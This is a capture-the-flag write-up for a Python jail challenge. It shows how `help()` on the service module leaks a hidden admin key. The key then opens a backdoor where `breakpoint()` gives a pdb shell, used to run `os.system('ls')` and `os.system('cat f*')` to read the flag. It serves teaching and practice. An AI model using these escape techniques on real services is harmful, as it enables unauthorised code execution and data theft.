This challenge will use `help()` and `breakpoint()`

First period 

in `gUeST` function:

6 byte to leak var of file if it has 8 bytes u can use `locals()` meanwhile if it has 9 bytes u can use `globals()` 

but for 6 bytes 

we can use `help()` to leak the var of key in the remote

Because help() can contain the module of filename which attachment gived and it will load it and run it twice and leak the var of `key`


```
python .\service.py

       __  __ _          ______       ___    _      ______      _  __
      |  \/  | |        |  ____|     / _ \  | |    |  ____|    | |/ /
   ___| \  / | |__  _ __| |__  _   _| | | | | |    | |__   __ _| ' /
  / _ \ |\/| | '_ \| '__|  __|| | | | | | | | |    |  __| / _` |  <
 |  __/ |  | | |_) | |  | |___| |_| | |_| | | |____| |___| (_| | . \
  \___|_|  |_|_.__/|_|  |______\__, |\___/  |______|______\__,_|_|\_                                __/ |

                               |___/


Now the program has two functions
can you use B@cKd0oR
1.gUeST
2.B@cKd0oR
Choice > 1
Welcome to the gUeST func
It's time to input your command:
Command > help()

Welcome to Python 3.8's help utility!

If this is your first time using Python, you should definitely check out
the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type "quit".

To get a list of available modules, keywords, symbols, or topics, type
"modules", "keywords", "symbols", or "topics".  Each module also comes
with a one-line summary of what it does; to list the modules whose name
or summary contain a given string such as "spam", type "modules spam".

help> help()
No Python documentation found for 'help()'.
Use help() to get the interactive help utility.
Use help(str) for help on the str class.

help>
You are now leaving help and returning to the Python interpreter.
If you want to ask for help on a particular object directly from the
interpreter, you can type "help(object)".  Executing "help('string')"
has the same effect as typing a particular string at the help> prompt.
None
PS D:\data\CTF\my challenge\CSAW Final\Misc\eMbrEy0 LEaK\deploy> python .\service.py

       __  __ _          ______       ___    _      ______      _  __
      |  \/  | |        |  ____|     / _ \  | |    |  ____|    | |/ /
   ___| \  / | |__  _ __| |__  _   _| | | | | |    | |__   __ _| ' /
  / _ \ |\/| | '_ \| '__|  __|| | | | | | | | |    |  __| / _` |  <
 |  __/ |  | | |_) | |  | |___| |_| | |_| | | |____| |___| (_| | . \
  \___|_|  |_|_.__/|_|  |______\__, |\___/  |______|______\__,_|_|\_                                __/ |

                               |___/


Now the program has two functions
can you use B@cKd0oR
1.gUeST
2.B@cKd0oR
Choice > 1
Welcome to the gUeST func
It's time to input your command:
Command > help()

Welcome to Python 3.8's help utility!

If this is your first time using Python, you should definitely check out
the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type "quit".

To get a list of available modules, keywords, symbols, or topics, type
"modules", "keywords", "symbols", or "topics".  Each module also comes
with a one-line summary of what it does; to list the modules whose name
or summary contain a given string such as "spam", type "modules spam".

help> service

       __  __ _          ______       ___    _      ______      _  __
      |  \/  | |        |  ____|     / _ \  | |    |  ____|    | |/ /
   ___| \  / | |__  _ __| |__  _   _| | | | | |    | |__   __ _| ' /
  / _ \ |\/| | '_ \| '__|  __|| | | | | | | | |    |  __| / _` |  <
 |  __/ |  | | |_) | |  | |___| |_| | |_| | | |____| |___| (_| | . \
  \___|_|  |_|_.__/|_|  |______\__, |\___/  |______|______\__,_|_|\_                                __/ |

                               |___/


Now the program has two functions
can you use B@cKd0oR
1.gUeST
2.B@cKd0oR
Choice > 1
Welcome to the gUeST func
It's time to input your command:
Command > help()

Welcome to Python 3.8's help utility!

If this is your first time using Python, you should definitely check out
the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type "quit".

To get a list of available modules, keywords, symbols, or topics, type
"modules", "keywords", "symbols", or "topics".  Each module also comes
with a one-line summary of what it does; to list the modules whose name
or summary contain a given string such as "spam", type "modules spam".

help> service
Help on module service:

NAME
    service

FUNCTIONS
    BacKd0oR()

    gUeST()

DATA
    WELCOME = '      \n       __  __ _          ______       ___...       ...
    input_data = '1'
    key_a16379411c7ea222 = 'd3967f4666b31fb2b415abca64f6b18c'
```

Second period

u can see the right var of key ==> `d3967f4666b31fb2b415abca64f6b18c` 

and input them into the BacKd0oR func 

then 12 byte to rce in python ==> `breakpoint()`

```
 python .\service.py

       __  __ _          ______       ___    _      ______      _  __
      |  \/  | |        |  ____|     / _ \  | |    |  ____|    | |/ /
   ___| \  / | |__  _ __| |__  _   _| | | | | |    | |__   __ _| ' /
  / _ \ |\/| | '_ \| '__|  __|| | | | | | | | |    |  __| / _` |  <
 |  __/ |  | | |_) | |  | |___| |_| | |_| | | |____| |___| (_| | . \
  \___|_|  |_|_.__/|_|  |______\__, |\___/  |______|______\__,_|_|\_                                __/ |

                               |___/


Now the program has two functions
can you use B@cKd0oR
1.gUeST
2.B@cKd0oR
Choice > 2
Welcome to the B@cKd0oR func
Please enter the admin key:
key > d3967f4666b31fb2b415abca64f6b18c
Command > breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) import os;os.system("ls")
__pycache__ flag service.py 
(Pdb) import os;os.system("cat f*")
flag{y0U_f1NiSHeD_EmpR3Yo_lAeK_Ch@L1EnGe_aNd_uSE_hE1p_T0_Le@k_ThE_vAr}
```
